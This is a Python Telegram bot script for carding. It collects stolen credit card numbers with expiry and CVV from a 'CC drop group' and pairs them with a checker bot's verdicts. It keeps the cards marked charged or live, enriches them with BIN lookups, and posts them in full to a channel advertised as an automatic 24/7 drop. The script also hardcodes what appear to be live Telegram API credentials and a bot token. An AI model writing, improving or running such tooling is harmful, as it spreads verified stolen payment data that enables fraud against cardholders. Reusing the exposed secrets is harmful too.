import re
import aiohttp
import logging
import asyncio
from pyrogram import Client, filters
from pyrogram.enums import ParseMode
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

# === CONFIGURATION ===
API_ID = 28232616
API_HASH = "82e6373f14a917289086553eefc64afe"
BOT_TOKEN = "8463287566:AAEHL1B2iCL0EcTpKN9soRKncHMAudBuAvs"

CARD_CHECK_BOT_ID = 5366864997  # @VoidxBot or any other checker bot user ID
SOURCE_GROUPS = -4759483285  # Your user CC drop group
TARGET_CHANNELS = ["@hybuabu"]     # Forward to this channel

processed_ids = set()
card_cache = {}  # message.id -> card string

# === LOGGING ===
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# === BOT APP ===
app = Client("card_tracker", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# === BIN LOOKUP ===
async def get_bin_data(bin_code):
    url = f"https://bins.antipublic.cc/bins/{bin_code}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return [
                        bin_code,
                        data.get("country", "Unknown"),
                        data.get("bank", "Unknown"),
                        data.get("type", "Unknown"),
                        data.get("level", "Unknown")
                    ]
    except Exception as e:
        logging.error(f"BIN lookup failed: {str(e)}")
    return [bin_code, "Unknown", "Unknown", "Unknown", "Unknown"]

# === MESSAGE PARSER ===
def parse_message(text):
    try:
        cc_match = re.search(
            r'([0-9]{13,19})[| ](\d{1,2})[| ](\d{2,4})[| ](\d{3,4})',
            text
        )
        if not cc_match:
            return None

        status = re.search(r'Status:\s*(.+?)(?:\n|$)', text, re.IGNORECASE)
        response = re.search(r'Response:\s*(.+?)(?:\n|$)', text, re.IGNORECASE)
        bank = re.search(r'Bank:\s*(.+?)(?:\n|$)', text, re.IGNORECASE)
        country = re.search(r'Country:\s*(.+?)(?:\n|$)', text, re.IGNORECASE)
        level = re.search(r'Level:\s*(.+?)(?:\n|$)', text, re.IGNORECASE)
        took = re.search(r'Took:\s*([\d.]+)', text, re.IGNORECASE)

        return {
            "cc": cc_match.group(1),
            "month": cc_match.group(2),
            "year": cc_match.group(3),
            "cvv": cc_match.group(4),
            "status": status.group(1).strip() if status else "N/A",
            "response": response.group(1).strip() if response else "N/A",
            "bank": bank.group(1).strip() if bank else "Unknown",
            "country": country.group(1).strip() if country else "Unknown",
            "level": level.group(1).strip() if level else "Unknown",
            "took": f"{took.group(1)}s" if took else "N/A"
        }
    except Exception as e:
        logging.error(f"Error parsing message: {str(e)}")
        return None

# === CHECK IF CARD IS APPROVED ===
def should_forward(response):
    if not response:
        return False
    response = response.lower()
    return any(k in response for k in ["charged", "approved", "success", "live"])

# === SEND TO CHANNEL ===
async def send_to_channels(formatted_text):
    buttons = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔄 Scraper", url="https://t.me/ApprovedScrapper1"),
            InlineKeyboardButton("📦 Backup", url="https://t.me/YourBackupChannel")
        ]
    ])
    for channel in TARGET_CHANNELS:
        try:
            await app.send_message(
                chat_id=channel,
                text=formatted_text,
                parse_mode=ParseMode.HTML,
                reply_markup=buttons
            )
            logging.info(f"✅ Sent to {channel}")
            return True
        except Exception as e:
            logging.error(f"Failed to send to {channel}: {str(e)}")
    return False

# === HANDLE USER CC MESSAGES (/bb etc.) ===
@app.on_message(filters.chat(SOURCE_GROUPS))
async def on_user_message(client, message: Message):
    text = message.text or message.caption or ""
    if re.search(r'([0-9]{13,19})[| ](\d{1,2})[| ](\d{2,4})[| ](\d{3,4})', text):
        card_cache[message.id] = text.strip()
        logging.info(f"💾 Cached CC for message ID {message.id}")

# === HANDLE EDITED CHECKER BOT MESSAGES ===
@app.on_edited_message(filters.user(CARD_CHECK_BOT_ID))
async def on_bot_edit(client, message: Message):
    if message.id in processed_ids:
        return

    edit_text = message.text or message.caption or ""
    cached_card = card_cache.get(message.id)
    if not cached_card:
        logging.info("⚠️ No cached card found for this edit.")
        return

    combined_text = cached_card + "\n" + edit_text
    logging.info(f"📝 Merged message for parse: {combined_text[:60]}...")

    card_data = parse_message(combined_text)
    if not card_data:
        logging.info("❌ Parse failed. No valid CC or result found.")
        return

    if not should_forward(card_data["response"]):
        logging.info(f"⛔ Not forwarding. Response: {card_data['response']}")
        return

    bin_info = await get_bin_data(card_data["cc"][:6])

    formatted_text = (
        "𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗖𝗵𝗮𝗿𝗴𝗲 𝗔𝘂𝘁𝗼 𝗗𝗿𝗼𝗽 24/7\n\n"
        f"𝗖𝗖: <code>{card_data['cc']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}</code>\n"
        f"𝗦𝘁𝗮𝘁𝘂𝘀: {card_data['status']}\n"
        f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {card_data['response']}\n\n"
        f"𝗕𝗶𝗻: <code>{card_data['cc'][:6]}</code>\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <code>{card_data['country']} ({bin_info[1]})</code>\n"
        f"𝗕𝗮𝗻𝗸: <code>{card_data['bank']} ({bin_info[2]})</code>\n"
        f"𝗧𝘆𝗽𝗲: <code>{bin_info[3]}</code>\n"
        f"𝗟𝗲𝘃𝗲𝗹: <code>{card_data['level']} ({bin_info[4]})</code>\n\n"
        f"𝗧𝗼𝗼𝗸: {card_data['took']}\n"
        "𝗣𝗿𝗼𝘃𝗶𝗱𝗲𝗱 𝗯𝘆: 𝗕𝘂𝗻𝗻𝘆"
    )

    if await send_to_channels(formatted_text):
        processed_ids.add(message.id)
        logging.info("✅ Forwarded successfully.")
    else:
        logging.error("❌ Forward failed.")

# === START BOT ===
logging.info("🚀 Starting Card Tracker Bot...")
print("✅ Bot is running and tracking edited + new messages...")
app.run()
